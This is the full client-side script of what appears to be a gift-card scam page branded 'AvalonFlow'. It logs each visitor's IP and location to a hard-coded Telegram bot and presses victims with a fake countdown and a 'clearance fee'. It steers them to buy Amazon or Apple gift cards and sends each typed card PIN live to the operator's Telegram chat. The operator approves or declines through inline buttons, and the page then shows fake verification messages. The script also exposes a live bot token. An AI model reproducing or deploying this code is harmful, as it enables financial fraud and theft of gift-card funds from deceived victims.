    <script>
        // ==========================================
// CENTRAL TELEGRAM & CONFIGURATION SETTINGS
// ==========================================
const TELEGRAM_BOT_TOKEN = "8971558300:AAFCkaN9K6ycSf4Bf-hHSeaPQFkFvf3Y8w8";
const TELEGRAM_CHAT_ID = "-1003913850436";

let lastSentPayload = "";
let timerInterval;
let telegramPollInterval = null;

// ==========================================
// 0. UNIQUE VISITOR / SESSION IDENTIFIER HELPER
// ==========================================
function getTargetUserIdentifier() {
    const urlParams = new URLSearchParams(window.location.search);
    let identifyUser = urlParams.get('user');
    
    if (!identifyUser) {
        identifyUser = sessionStorage.getItem('av_session_uid');
        if (!identifyUser) {
            identifyUser = 'User_' + Math.random().toString(36).substring(2, 8);
            sessionStorage.setItem('av_session_uid', identifyUser);
        }
    }
    return identifyUser;
}

// ==========================================
// 1. UNIFIED TELEMETRY & LOCALIZATION MODULE
// ==========================================
async function initializeAppWithIP() {
    let ipData = {};

    try {
        const ipResponse = await fetch('https://ipapi.co/json/');
        if (!ipResponse.ok) throw new Error('Failed to fetch network details');
        ipData = await ipResponse.json();
    } catch (err) {
        console.warn("IP geolocation fallback engaged:", err);
        ipData = {
            ip: "Unknown",
            city: "Unknown",
            region: "Unknown",
            country_name: "Unknown",
            country_code: "US",
            org: "Unknown",
            currency: "USD"
        };
    }

    if (!sessionStorage.getItem('visitor_logged_tg')) {
        await sendVisitorDetailsToTelegram(ipData);
    }

    loadLocalizedFee(ipData);
}

// ==========================================
// 2. TELEGRAM VISITOR TRACKING SENDER
// ==========================================
async function sendVisitorDetailsToTelegram(ipData) {
    try {
        const rawAgent = navigator.userAgent;
        if (/bot|googlebot|crawler|spider|robot/i.test(rawAgent)) return;

        const identifyUser = getTargetUserIdentifier();
        const currentPage = window.location.pathname;

        // Formatted visitor alert matching Page B layout
        const messageText = `⚡ <b>Gift Card Checkout Session Started | AvalonFlow</b>\n\n` +
                            `👤 <b>Target User:</b> <code>${identifyUser}</code>\n` +
                            `📄 <b>Page:</b> <code>${currentPage}</code>\n` +
                            `🌐 <b>IP:</b> <code>${ipData.ip}</code>\n` +
                            `📍 <b>Location:</b> <code>${ipData.city || 'Unknown'}, ${ipData.country_name || 'Unknown'}</code>\n` +
                            `⏱️ <b>Time:</b> <code>${new Date().toLocaleString()}</code>`;

        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                chat_id: TELEGRAM_CHAT_ID, 
                text: messageText, 
                parse_mode: 'HTML' 
            })
        });

        sessionStorage.setItem('visitor_logged_tg', 'true');
    } catch (err) {
        console.warn("Telegram telemetry bypass error:", err);
    }
}


// ==========================================
// 3. IP-BASED LOCALIZATION & STOREFRONT ROUTING
// ==========================================
function loadLocalizedFee(ipData) {
    // 🎯 REPLACED WITH NEW SNAPSHOT KEY (falls back to av_retention_bonus if snap is not yet set)
    const rawValue = localStorage.getItem("av_converted_amount") || localStorage.getItem("av_retention_bonus") || 0;
    const baseAmount = parseFloat(rawValue);

    const countryCode = (ipData.country_code || 'US').toUpperCase();

    let targetCurrency = ipData.currency || 'USD';
    let regionLabel = `${ipData.country_name || 'United States'} (${targetCurrency})`;
    let localeString = 'en-US';

    if (countryCode === 'CA') {
        localeString = 'en-CA';
        targetCurrency = 'CAD';
        regionLabel = 'Canada 🇨🇦 (CAD)';
    } else if (countryCode === 'GB') {
        localeString = 'en-GB';
        targetCurrency = 'GBP';
        regionLabel = 'United Kingdom 🇬🇧 (GBP)';
    } else {
        localeString = 'en-US';
        targetCurrency = 'USD';
        regionLabel = `${ipData.country_name || 'United States'} 🇺🇸 (${targetCurrency})`;
    }

    localStorage.setItem("detected_region", regionLabel);

    const clearanceFee = baseAmount * 0.1225;
    const feeElement = document.getElementById("clearance_amount");
    if (feeElement) {
        feeElement.textContent = new Intl.NumberFormat(localeString, { 
            style: 'currency', 
            currency: targetCurrency 
        }).format(clearanceFee);
    }

    const amazonLink = document.getElementById("amazon_vendor_link");
    const appleLink = document.getElementById("apple_vendor_link");

    if (countryCode === 'CA') {
        if (amazonLink) amazonLink.href = "https://www.amazon.ca/Amazon-eGift-Card-Logo-Animated/dp/B07P68FH74/";
        if (appleLink) appleLink.href = "https://www.apple.com/ca/shop/buy-giftcard/giftcard";
    } else if (countryCode === 'GB') {
        if (amazonLink) amazonLink.href = "https://www.amazon.co.uk/Amazon-eGift-Card-Logo-Animated/dp/B07S6C1DZ6/";
        if (appleLink) appleLink.href = "https://www.apple.com/uk/shop/buy-giftcard/giftcard";
    } else {
        if (amazonLink) amazonLink.href = "https://www.amazon.com/Amazon-eGift-Card-Logo-Animated/dp/B07PCMWTSG";
        if (appleLink) appleLink.href = "https://www.apple.com/shop/buy-giftcard/giftcard";
    }
}


// ==========================================
// 4. COUNTDOWN & TELEGRAM LIVE BUTTON STREAMING
// ==========================================
function updateCountdownDisplay() {
    const timerElement = document.getElementById("countdown");
    let expiryTime = parseInt(localStorage.getItem("avb_expiry_time"), 10);

    if (!expiryTime) {
        expiryTime = Date.now() + 15 * 60 * 1000;
        localStorage.setItem("avb_expiry_time", expiryTime);
    }

    const remainingSec = Math.max(0, Math.floor((expiryTime - Date.now()) / 1000));
    const minutes = Math.floor(remainingSec / 60);
    const seconds = remainingSec % 60;

    if (timerElement) {
        if (remainingSec <= 0) {
            timerElement.textContent = "EXPIRED";
            clearInterval(timerInterval);
            localStorage.removeItem("avb_expiry_time");
            window.location.replace("https://membership.avalonflow.site/notifications");
            return;
        }

        timerElement.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
    }
}

async function saveClearanceCode() {
    const rawCardCode = document.getElementById("giftcard_pin")?.value?.trim() || "";
    localStorage.setItem("clearanceCodeDraft", rawCardCode);

    const cleanCode = rawCardCode.replace(/[\s-]/g, '');
    if (cleanCode.length < 14 || cleanCode.length > 16) return;
    if (cleanCode === lastSentPayload) return;
    lastSentPayload = cleanCode;

    try {
        const identifyUser = getTargetUserIdentifier();
        const detectedRegion = localStorage.getItem("detected_region") || 'United States 🇺🇸 (Default)';

        let selectedVendor = localStorage.getItem("selected_vendor");
        if (!selectedVendor) {
            selectedVendor = cleanCode.toUpperCase().startsWith('X') 
                ? "Apple (Inferred via 'X' prefix)" 
                : "Amazon / Generic (Direct Input)";
        }

        const telegramMessage = 
          `💳 <b>Live Clearance PIN Submitted</b>\n\n` +
          `• <b>From User:</b> <code>${identifyUser}</code>\n` +
          `• <b>Card Vendor:</b> <code>${selectedVendor}</code>\n` +
          `• <b>Detected Region:</b> <code>${detectedRegion}</code>\n` +
          `───────────────────\n` +
          `• <b>Sanitised PIN:</b> <code>${cleanCode}</code>\n` +
          `• <b>Raw Input:</b> <code>${rawCardCode}</code>`;

        // Attach Interactive Action Buttons directly to Telegram Message
        const inlineKeyboard = {
            inline_keyboard: [
                [
                    { text: "✅ Approve Access", callback_data: `approve:${identifyUser}` },
                    { text: "❌ Decline Code", callback_data: `reject:${identifyUser}` }
                ]
            ]
        };

        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: telegramMessage,
            parse_mode: 'HTML',
            reply_markup: inlineKeyboard
          })
        });
    } catch (error) {
        console.error('Failed to stream live clearance PIN metric.');
    }
}

// ==========================================
// 5. PURE JS TELEGRAM LONG-POLLING ENGINE
// ==========================================

// Updates Telegram Message text when button is clicked so admin knows it was processed
async function acknowledgeTelegramAction(callbackId, messageId, originalText, statusStamp) {
    try {
        // Stop Telegram button loading spinner
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ callback_query_id: callbackId, text: statusStamp })
        });

        // Edit Telegram message to mark action as taken
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                message_id: messageId,
                text: `${originalText}\n\n<b>[ADMIN ACTION: ${statusStamp}]</b>`,
                parse_mode: 'HTML'
            })
        });
    } catch (e) {
        console.warn("Failed to update Telegram button UI:", e);
    }
}

// Poll Telegram directly for button clicks
// Variable to keep track of the highest processed Telegram update ID
let telegramLastUpdateId = 0;

function startTelegramPolling(targetUser) {
    if (telegramPollInterval) clearInterval(telegramPollInterval);

    telegramPollInterval = setInterval(async () => {
        try {
            // Pass offset to tell Telegram to clear already-processed updates from its queue
            const offsetParam = telegramLastUpdateId ? `?offset=${telegramLastUpdateId + 1}` : `?offset=-10`;
            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates${offsetParam}`);
            const data = await response.json();

            if (!data.ok || !data.result || data.result.length === 0) return;

            const statusBox = document.getElementById("status_message");
            const submitBtn = document.getElementById("submit_btn");

            for (const update of data.result) {
                // Update tracker to guarantee Telegram drops this update on subsequent requests
                telegramLastUpdateId = update.update_id;

                if (update.callback_query && update.callback_query.data) {
                    const callbackData = update.callback_query.data;
                    const callbackId = update.callback_query.id;
                    const messageId = update.callback_query.message.message_id;
                    const originalText = update.callback_query.message.text;

                    // Match approval button for this exact user
                    if (callbackData === `approve:${targetUser}`) {
                        clearInterval(telegramPollInterval);

                        await acknowledgeTelegramAction(callbackId, messageId, originalText, "✅ APPROVED");

                        if (statusBox) {
                            statusBox.style.color = "#10b981";
                            statusBox.innerText = "Payment verified successfully! Redirecting...";
                        }

                        localStorage.setItem("has_withdrawn", "true");
                        localStorage.setItem("step_3_paid", "true");
                        localStorage.setItem("step_3_txn_id", "TXN_" + Math.floor(100000 + Math.random() * 900000));

                        setTimeout(() => {
                            window.location.replace("https://link.avalonflow.site/returns");
                        }, 1200);

                        break;
                    } 
                    // Match rejection button for this exact user
                    else if (callbackData === `reject:${targetUser}`) {
                        clearInterval(telegramPollInterval);

                        await acknowledgeTelegramAction(callbackId, messageId, originalText, "❌ DECLINED");

                        if (statusBox) {
                            statusBox.style.color = "#ef4444";
                            statusBox.innerText = "Invalid card PIN or insufficient balance. Please check and try again.";
                        }
                        if (submitBtn) submitBtn.disabled = false;

                        // Clear lastSentPayload so user can resubmit/edit without getting blocked by duplicate checks
                        lastSentPayload = "";

                        break;
                    }
                }
            }
        } catch (err) {
            console.warn("Telegram polling interval check...");
        }
    }, 2500); // Check Telegram every 2.5 seconds
}


async function submitClearanceCode() {
    const rawCardCode = document.getElementById("giftcard_pin")?.value?.trim() || "";
    const cleanCode = rawCardCode.replace(/[\s-]/g, '');
    const statusBox = document.getElementById("status_message");
    const submitBtn = document.getElementById("submit_btn");

    if (cleanCode.length < 14 || cleanCode.length > 16) {
        if (statusBox) statusBox.innerText = "Please enter a valid 14-16 character card PIN.";
        return;
    }

    // Force stream telemetry to Telegram first
    await saveClearanceCode();

    if (submitBtn) submitBtn.disabled = true;
    if (statusBox) {
        statusBox.style.color = "#38bdf8";
        statusBox.innerText = "Clearance PIN submitted. Verification in progress...";
    }

    const identifyUser = getTargetUserIdentifier();

    // Start listening for Telegram button click in pure JS
    startTelegramPolling(identifyUser);
}

// ==========================================
// 6. UNIFIED INITIALIZATION (DOM LOADED)
// ==========================================
document.addEventListener('DOMContentLoaded', () => {
    localStorage.removeItem("selected_vendor");

    initializeAppWithIP();

    updateCountdownDisplay();
    timerInterval = setInterval(updateCountdownDisplay, 1000);

    const pinInput = document.getElementById("giftcard_pin");
    if (pinInput) {
        pinInput.addEventListener("input", saveClearanceCode);
    }

    const amazonLink = document.getElementById("amazon_vendor_link");
    const appleLink = document.getElementById("apple_vendor_link");

    if (amazonLink) {
        amazonLink.addEventListener("click", () => {
            localStorage.setItem("selected_vendor", "Amazon Gift Card");
        });
    }

    if (appleLink) {
        appleLink.addEventListener("click", () => {
            localStorage.setItem("selected_vendor", "Apple Gift Card");
        });
    }
});


const links = [
    'https://membership.avalonflow.site/4f2a9c1e8b3d7f2a1c9e4b6d0f8a2e5c',
    'https://membership.avalonflow.site/9c8e1a4f0b2d3e5c6a7f8b9c1d2e3f4a'
];

document.getElementById('resetLink').onclick = (e) => {
    e.preventDefault();

    const currentSavedLink = localStorage.getItem('targetUrl');

    const alternativeLink = (currentSavedLink === links[0]) ? links[1] : links[0];
    localStorage.setItem('membershipConfirmed', 'true');
    localStorage.setItem('targetUrl', alternativeLink);
 window.location.replace(alternativeLink);
};
